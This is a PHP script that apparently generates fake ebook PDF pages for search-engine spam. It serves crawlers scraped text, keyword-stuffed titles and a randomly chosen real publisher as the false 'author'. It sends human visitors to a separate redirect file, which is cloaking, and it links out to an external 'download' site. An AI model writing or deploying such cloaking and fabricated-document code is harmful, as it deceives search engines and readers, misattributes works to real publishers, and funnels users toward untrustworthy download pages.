<?php
error_reporting(-1);
ini_set('display_errors',1);
ini_set('display_startup_errors',1);


function js_spin($s){   $s = str_replace(array('{','}'),'',$s); $e = explode("|", $s); shuffle($e); $t = $e[0]; return $t; }
function rf_slug($str) {   $str = urldecode($str);   $delimiter='-'; 	$clean = iconv('UTF-8', 'ASCII//TRANSLIT', $str); 	$clean = preg_replace("/[^a-zA-Z0-9\/_|+ -]/", '', $clean); 	$clean = strtolower(trim($clean, '-')); 	$clean = preg_replace("/[\/_|+ -]+/", $delimiter, $clean);     if (substr($clean, 0, 1) == '-'){ $clean = substr($clean, 1);}  	return $clean; }

$cURI = explode("/", $_SERVER["REQUEST_URI"]);
$replace=array("+","-","%20","_",".pdf","pdf","download","epub","mobi");
$this_title= str_replace($replace,' ',$cURI[count($cURI)-1]);
$titleku = $this_title;


require 'fungsi.php';

//page data

$page_title= ucwords($this_title);


//end page data


if(!is_bot()){

include('redir.php');
exit();
}

$this_titleku = ''.potong($this_title,4);
$hasilbing= rss_curl2($this_titleku);

	if($hasilbing == null){
	header('HTTP/1.1 503 Service Temporarily Unavailable');
	header('Status: 503 Service Temporarily Unavailable');
	header('Retry-After: 3600');//1jam
	exit('Database Bussy');
	}
$suggest = kwsugest($titleku);
if(count($suggest)>0){
	foreach($suggest as $key) {
		$titlenya = trim($key);
		$rel_slug = title2URL($titlenya);
			$htmlsuggest .= "<a href='/$rel_slug.pdf'>$titlenya</a>,";
}
}

$authors =array('Bloomsbury Publishing Plc','A. C. McClurg','A. S. Barnes','Abilene Christian University Press','Ablex Publishing','Academic Press',
'A & C Black','A. C. McClurg','A. S. Barnes','Abilene Christian University Press','Ablex Publishing','Academic Press','Ace Books','Adis International',
'Airiti Press','Akashic Books','Aladdin Publisher','Alfred A. Knopf','Allen & Unwin','Allison and Busby','Alyson Books','American Graphics Institute',
'Andrews McMeel Publishing','Anova Books','Anvil Press Poetry','Applewood Books','Apress','Arbor House','Arbordale Publishing','Arcade Publishing',
'Arcadia Publishing','Arkham House','Armida Publications','ArtScroll','Athabasca University Press','Atheneum Books','Atheneum Publishers','Atlantic Books',
'Atlas Press','ATOM Books','Atria Publishing Group','Augsburg Fortress','Aunt Lute Books','Austin Macauley Publishers','Avon (publishers)','B & W Publishing',
'Baen Books','Baker Book House','Ballantine Books','Banner of Truth Trust','Bantam Books','Bantam Spectra','Barrie & Jenkins','Basic Books','BBC Books',
'Beacon Publishing','Harvard University Press','Bella Books','Bellevue Literary Press','Berg Publishers','Berkley Books','Bison Books','Black Dog Publishing',
'Black Library','Black Sparrow Books','Blackie and Son Limited','Blackstaff Press','Blackwell Publishing','John Blake Publishing','Bloodaxe Books',
'Bloomsbury Publishing Plc','Blue Ribbon Books','Bobbs-Merrill Company','Bogle-L\'Ouverture Publications','Book League of America','Book Works','Booktrope',
'Borgo Press','Boundless (company)','Bowes & Bowes','Boydell & Brewer','Broadside Lotus Press','Breslov Research Institute','Brill Publishers',
'Brimstone Press','Broadview Press','Burns & Oates','Butterworth-Heinemann','Caister Academic Press','Cambridge University Press','Candlewick Press',
'Candy Jar Ltd','Canongate Books','Carcanet Press','Carlton Books','Carlton Publishing Group','Carnegie Mellon University Press','Casemate Publishers',
'Cassava Republic Press','Orion Publishing Group','Cengage Learning','Central European University Press','Century (imprint)','Chambers Harrap',
'Charles Scribner\'s Sons','Chatto and Windus','Chick Publications','Chronicle Books','Churchill Livingstone','Cisco Press','City Lights Publishers',
'Cloverdale Corporation','Cold Spring Harbor Laboratory Press','Collector\'s Guide Publishing','HarperCollins','Columbia University Press',
'Concordia Publishing House','Constable & Co Ltd','Continuum International Publishing Group','Copper Canyon Press','Cork University Press',
'Cornell University Press','Coronet Books','Craftsman Book Company','CRC Press','Cresset Press','Crocker & Brewster','Crown Publishing Group',
'D. Appleton & Company','D. Reidel','Da Capo Press','Daedalus Publishing (page does not exist)','Dalkey Archive Press','Darakwon Press','David & Charles',
'DAW Books','Dedalus Books','Del Rey Books','Delacorte Press','Deseret Book','Dick and Fitzgerald','Directmedia Publishing','DNA Publications',
'Dobson Books','Dodd, Mead and Company','Dorchester Publishing','Dorling Kindersley','Doubleday (publisher)','Douglas & McIntyre','Dove Medical Press',
'Dover Publications','Dundurn Group','E. P. Dutton','Earthscan','ECW Press','Eel Pie Publishing','Eerdmans Publishing','Elliot Stock','Ellora\'s Cave',
'Elsevier','Emerald Group Publishing','Etruscan Press','Europa Press','Everyman\'s Library','Ewha Womans University Press','Exact Change',
'Express Publishing','Faber and Faber','FabJob','Fairview Press','Farrar, Straus & Giroux','Fearless Books','Felony & Mayhem Press','Firebrand Books',
'Flame Tree Publishing','Focal Press','Folio Society','Forum Media Group','Four Courts Press','Four Walls Eight Windows','Frederick Fell Publishers, Inc.',
'Frederick Warne & Co','Free Press (publisher)','Fulcrum Press','Funk & Wagnalls','G. P. Putnam\'s Sons','G-Unit Books','Gaspereau Press',
'Gay Men\'s Press','Gefen Publishing House','George H. Doran Company','George Newnes','George Routledge & Sons','Godwit Press','Golden Cockerel Press',
'The Good Book Company','Good News Publishers','Goops Unlimited','Goose Lane Editions','Grafton (publisher)','Graywolf Press','Greenery Press',
'Greenleaf Book Group','Greenleaf Publishing Ltd','Greenwillow Books','Greenwood Publishing Group','Gregg Press','Grosset & Dunlap','Grove Press',
'Hachette Book Group USA','Hackett Publishing Company','Hamish Hamilton','Happy House','Harcourt Assessment','Harcourt Trade Publishers',
'Harlequin Enterprises Ltd','Harper & Brothers','Harper & Row','HarperCollins','HarperPrism','HarperTrophy','Harry N. Abrams, Inc.','Harvard University Press',
'Harvest House','Harvill Press at Random House','Hawthorne Books','Hay House','Haynes Manuals','Heinemann (book publisher)','Herbert Jenkins Ltd',
'Heyday Books','HMSO','Hodder & Stoughton','Hodder Headline','Hogarth Press','Holland Park Press','Holt McDougal','Hoover Institution',
'Horizon Scientific Press','Houghton Mifflin','House of Anansi Press','The House of Murky Depths','Howell-North Books','Huffington Post','Humana Press',
'Hutchinson (publisher)','Hyperion (publisher)','Ian Allan Publishing','fr:IGI Global','Ignatius Press','Imperial War Museum','Indiana University Press',
'Informa Healthcare','Information Age Publishing','Insomniac Press','International Association of Engineers','International Universities Press',
'Inter-Varsity Press','InterVarsity Press','Ishi Press','Islamic Texts Society','Island Press','Ivyspring International Publisher','J. M. Dent',
'Jaico Publishing House','Jarrolds Publishing','John Lane (publisher)','John Murray (publisher)','John Wiley & Sons','Jones and Bartlett Learning',
'Karadi Tales','Kensington Books','Kessinger Publishing','Springer Science+Business Media','Kodansha','Kogan Page','Koren Publishers Jerusalem',
'KTAV Publishing House','Kumarian Press','Ladybird Books','Leaf Books','Leafwood Publishers','Left Book Club','Legend Books','Legend Press','Lethe Press',
'Libertas Academica','Liberty Fund','Library of America','Lion Hudson','Lion Publishing','Lionel Leventhal','Lippincott Williams & Wilkins',
'Little, Brown and Company','Liverpool University Press','Llewellyn Worldwide','Longman','LPI Media','Lutterworth Press','Macmillan Publishers',
'Mainstream Publishing','Manchester University Press','Mandrake of Oxford','Mandrake Press','Manning Publications','Manor House Publishing',
'Mapin Publishing','Marion Boyars Publishers','Mark Batty Publisher','Marshall Cavendish','Marshall Pickering','Martinus Nijhoff Publishers',
'Matthias Media','McClelland and Stewart','McFarland & Company','McGraw-Hill Education','McGraw Hill Financial','Medknow Publications',
'Melbourne University Publishing','Mercier Press','Methuen Publishing','Michael Joseph (publisher)','Michael O\'Mara Books','Michigan State University Press',
'Microsoft Press','The Miegunyah Press','Miles Kelly Publishing','Mills & Boon','Minerva Press','Mirage Publishing','MIT Press','Mkuki na Nyota',
'Modern Library','Morgan James Publishing','Mother Tongue Publishing','Mycroft & Moran','Myriad Editions','Naiad Press','Nauka (publisher)','NavPress',
'New American Library','New Beacon Books','New Directions Publishing','New English Library','New Holland Publishers','New Village Press','George Newnes',
'No Starch Press','Nonesuch Press','Noontide Press','Northwestern University Press','NRC Research Press','NYRB Classics','Oberon Books',
'Open Court Publishing Company','Open University Press','Orchard Books','O\'Reilly Media','Orion Books','Orion Publishing Group','Osprey Publishing',
'Other Press','The Overlook Press','Oxford University Press','Packt Publishing','Palgrave Macmillan','Pan Books','Pantheon Books at Random House',
'Papadakis Publisher','Parachute Publishing','Parragon','Pathfinder Press','Paulist Press','Pavilion Books','Peace Hill Press','Pecan Grove Press',
'Pen and Sword Books','Penguin Books','Penguin Random House','Penguin Putnam Inc.','Penn State University Press','Persephone Books','Perseus Books Group',
'Peter Lang (publishing company)','Peter Owen Publishers','Phaidon Press','Philosophy Documentation Center','Philtrum Press','Picador (imprint)',
'Pimlico Books at Random House','Playwrights Canada Press','Pluto Press','Point Blank (publisher)','Poisoned Pen Press','Policy Press','Polity (publisher)','Practical Action',
'Prentice Hall','Prime Books','Princeton University Press','Profile Books','Progress Publishers','Prometheus Books','Puffin Books','Que Publishing','Quebecor',
'Quirk Books','Random House','Reed Elsevier','Reed Publishing','Remington & Co','Riverhead Books','Robert Hale Publishing','Robson Books',
'Rock Scorpion Books','Rodopi Publishers','Routledge','Rowman & Littlefield','Royal Society of Chemistry','Russell Square Publishing','SAGE Publications',
'St. Martin\'s Press','Salt Publishing','Sams Publishing','Samuel French','Schocken Books','Scholastic Press','Charles Scribner\'s Sons','Seagull Books',
'Secker & Warburg','Serif (publisher)','Shambhala Publications','Shire Books','Shoemaker & Hoard Publishers','Shuter & Shooter Publishers',
'Sidgwick & Jackson','Signet Books','Simon & Schuster','Sinclair-Stevenson Ltd','Sounds True','Sourcebooks','South End Press','SPCK','Spinsters Ink',
'Springer Science+Business Media','Stanford University Press','The Stationery Office','Stein and Day','Summerwild Productions','Summit Media','SUNY Press',
'Sylvan Dell Publishing','T & T Clark','Tachyon Publications','Tammi (publishing company)','Target Books','Tarpaulin Sky Press','Tartarus Press',
'Tate Publishing & Enterprises','Taunton Press','Taylor & Francis','Ten Speed Press','Thames & Hudson','Thames & Hudson USA','Thieme Medical Publishers',
'Third World Press','Thomas Nelson (publisher)','Ticonderoga Publications','Time Inc.','Times Books','Titan Books','Top Shelf Productions','Tor Books',
'Triangle Books','Malcolm Whyte','Tupelo Press','Tuttle Publishing','Twelveheads Press','Two Dollar Radio','UCL Press',
'United States Government Publishing Office','Universal Publishers (United States)','University of Akron Press','University of Alaska Press',
'University of British Columbia Press','University of California Press','University of Chicago Press','University of Michigan Press',
'University of Minnesota Press','University of Nebraska Press','University of Pennsylvania Press','University of South Carolina Press',
'University of Toronto Press','University of Wales Press','University Press of America','University Press of Kansas','University Press of Kentucky',
'Usborne Publishing','Velazquez Press','Verso Books','Victor Gollancz Ltd','Viking Press','Vintage Books','Vintage Books at Random House','Virago Press',
'Virgin Publishing','Voyager Books','W. H. Allen Ltd','W. W. Norton & Company','Walter de Gruyter','Ward Lock & Co','WBusiness Books',
'Weidenfeld & Nicolson','Wesleyan University Press','WestBow Press','Westminster John Knox Press','Wildside Press','William Edwin Rudge',
'Windgate Press','Wipf and Stock','Wisdom Publications','Witherby Seamanship','Woodhead Publishing','Wordfarm','Workman Publishing','World Publishing Company',
'World Scientific Publishing','Wrecking Ball Press','Wrox Press','Sanoma');
shuffle($authors);



$html1 =''.strtoupper($this_title).' PDF';

$htmldownload ='<a href="http://thebooksout.com/downloads/'.title3URL($this_title).'.pdf" rel="nofollow"> '.strtoupper($this_title).' DOWNLOAD </a>';

$htmlisi=''.$hasilbing['isi'].'';

$htmlsugest='<p>Related PDFs :<br />'.$htmlsuggest.'<br />'.$hasilbing['link'].'</p>';
$htmlsitemap='<p> <a href="'.$http_home_domain.'/sitemap.xml">sitemap index</a></p>';



$htmltitle='Download Books '.ucwords($this_title).' , Download Books '.ucwords($this_title).' Online , Download Books '.ucwords($this_title).' Pdf , Download Books '.ucwords($this_title).' For Free , Books '.ucwords($this_title).' To Read , Read  Online  '.ucwords($this_title).' Books , Free Ebook '.ucwords($this_title).' Download , Ebooks '.ucwords($this_title).' Free Download Pdf , Free Pdf Books '.ucwords($this_title).' Download , Read Online Books '.ucwords($this_title).' For Free Without Downloading';
require('fpdf.php');

function hex2dec($couleur = "#000000"){
    $R = substr($couleur, 1, 2);
    $rouge = hexdec($R);
    $V = substr($couleur, 3, 2);
    $vert = hexdec($V);
    $B = substr($couleur, 5, 2);
    $bleu = hexdec($B);
    $tbl_couleur = array();
    $tbl_couleur['R']=$rouge;
    $tbl_couleur['V']=$vert;
    $tbl_couleur['B']=$bleu;
    return $tbl_couleur;
}

//conversion pixel -> millimeter at 72 dpi
function px2mm($px){
    return $px*25.4/72;
}

function txtentities($html){
    $trans = get_html_translation_table(HTML_ENTITIES);
    $trans = array_flip($trans);
    return strtr($html, $trans);
}
class PDF extends FPDF
{
var $B;
var $I;
var $U;
var $HREF;
var $fontList;
var $issetfont;
var $issetcolor;
protected $col = 0; // Current column
protected $y0;      // Ordinate of column start


function WriteHTML($html,&$parsed)
{
    //HTML parser
    $html=strip_tags($html,"<b><u><i><a><img><p><br><strong><em><font><tr><blockquote>"); //supprime tous les tags sauf ceux reconnus
    $html=str_replace("\n",' ',$html); //remplace retour à la ligne par un espace
    $a=preg_split('/<(.*)>/U',$html,-1,PREG_SPLIT_DELIM_CAPTURE); //éclate la chaîne avec les balises
    foreach($a as $i=>$e)
    {
        if($i%2==0)
        {
            //Text
            if($this->HREF)
                $this->PutLink($this->HREF,$e);
            else
                $parsed.=stripslashes(txtentities($e));
        }
        else
        {
            //Tag
            if($e[0]=='/')
                $this->CloseTag(strtoupper(substr($e,1)));
            else
            {
                //Extract attributes
                $a2=explode(' ',$e);
                $tag=strtoupper(array_shift($a2));
                $attr=array();
                foreach($a2 as $v)
                {
                    if(preg_match('/([^=]*)=["\']?([^"\']*)/',$v,$a3))
                        $attr[strtoupper($a3[1])]=$a3[2];
                }
                $this->OpenTag($tag,$attr);
            }
        }
    }
}

function OpenTag($tag, $attr)
{
    //Opening tag
    switch($tag){
        case 'STRONG':
            $this->SetStyle('B', true);
            break;
        case 'EM':
            $this->SetStyle('I', true);
            break;
        case 'B':
        case 'I':
        case 'U':
            $this->SetStyle($tag, true);
            break;
        case 'A':
            $this->HREF=$attr['HREF'];
            break;
        case 'IMG':
            if(isset($attr['SRC']) && (isset($attr['WIDTH']) || isset($attr['HEIGHT']))) {
                if(!isset($attr['WIDTH']))
                    $attr['WIDTH'] = 0;
                if(!isset($attr['HEIGHT']))
                    $attr['HEIGHT'] = 0;
                $this->Image($attr['SRC'], $this->GetX(), $this->GetY(), px2mm($attr['WIDTH']), px2mm($attr['HEIGHT']));
            }
            break;
        case 'TR':
        case 'BLOCKQUOTE':
        case 'BR':
            $this->Ln(5);
            break;
        case 'P':
            $this->Ln(10);
            break;
        case 'FONT':
            if (isset($attr['COLOR']) && $attr['COLOR']!='') {
                $coul=hex2dec($attr['COLOR']);
                $this->SetTextColor($coul['R'], $coul['V'], $coul['B']);
                $this->issetcolor=true;
            }
            if (isset($attr['FACE']) && in_array(strtolower($attr['FACE']), $this->fontlist)) {
                $this->SetFont(strtolower($attr['FACE']));
                $this->issetfont=true;
            }
            break;
    }
}

function CloseTag($tag)
{
    //Closing tag
    if($tag=='STRONG')
        $tag='B';
    if($tag=='EM')
        $tag='I';
    if($tag=='B' || $tag=='I' || $tag=='U')
        $this->SetStyle($tag, false);
    if($tag=='A')
        $this->HREF='';
    if($tag=='FONT'){
        if ($this->issetcolor==true) {
            $this->SetTextColor(0);
        }
        if ($this->issetfont) {
            $this->SetFont('arial');
            $this->issetfont=false;
        }
    }
}

function SetStyle($tag, $enable)
{
    //Modify style and select corresponding font
    $this->$tag+=($enable ? 1 : -1);
    $style='';
    foreach(array('B', 'I', 'U') as $s)
    {
        if($this->$s>0)
            $style.=$s;
    }
    $this->SetFont('', $style);
}

function SetCol($col)
{
    // Set position at a given column
    $this->col = $col;
    $x = 10+$col*60;
    $this->SetLeftMargin($x);
    $this->SetX($x);
}

function AcceptPageBreak()
{
    // Method accepting or not automatic page break
    if($this->col<2)
    {
        // Go to next column
        $this->SetCol($this->col+1);
        // Set ordinate to top
        $this->SetY($this->y0);
        // Keep on page
        return false;
    }
    else
    {
        // Go back to first column
        $this->SetCol(0);
        // Page break
        return true;
    }
}
function PutLink($URL, $txt)
{
    //Put a hyperlink
    $this->SetTextColor(0, 0, 255);
    $this->SetStyle('U', true);
    $this->Write(5, $txt, $URL);
    $this->SetStyle('U', false);
    $this->SetTextColor(0);
}

function Footer()
{
$cURI = explode("/", $_SERVER["REQUEST_URI"]);
$replace=array("+","-","%20","_",".pdf","pdf","download","epub","mobi");
$this_title= str_replace($replace,' ',$cURI[count($cURI)-1]);
$titleku = $this_title;
    // Go to 1.5 cm from bottom
    $this->SetY(-19);
    // Select Arial italic 8
    $this->SetFont('Arial','I',8);
    // Print centered page number
    $this->Cell(0,10,''.$this_title.' PDF ePub Mobi',0,0,'C');
	$this->SetY(-16);
	$this->Cell(0,10,'Download '.$this_title.' (PDF, ePub, Mobi)',0,0,'C');
	$this->SetY(-13);
	$this->Cell(0,10,'Books '.$this_title.' (PDF, ePub, Mobi)',0,0,'C');
	$this->SetY(-10);
    $this->Cell(0,10,'Page '.$this->PageNo(),0,0,'C');
}

}


$pdf = new PDF();

$pdf->SetAuthor($authors[0]);
$pdf->SetKeywords(''.$htmltitle.'');
$pdf->SetSubject(''.$page_title.'');
$pdf->SetTitle('Free '.$page_title.' (PDF, ePub, Mobi)');
$pdf->SetFont('Arial','',11);
$pdf->AddPage();
$pdf->SetFont('Times','',12);
$pdf->WriteHTML($htmlisi,$parsed );
$pdf->Multicell(50,5, $parsed );
$pdf->Ln();
$pdf->WriteHTML($htmldownload);
$pdf->Ln();
$pdf->WriteHTML($htmlsugest);
$pdf->WriteHTML($htmlsitemap);
$pdf->Output($this_title.'.pdf','I'); 

?>
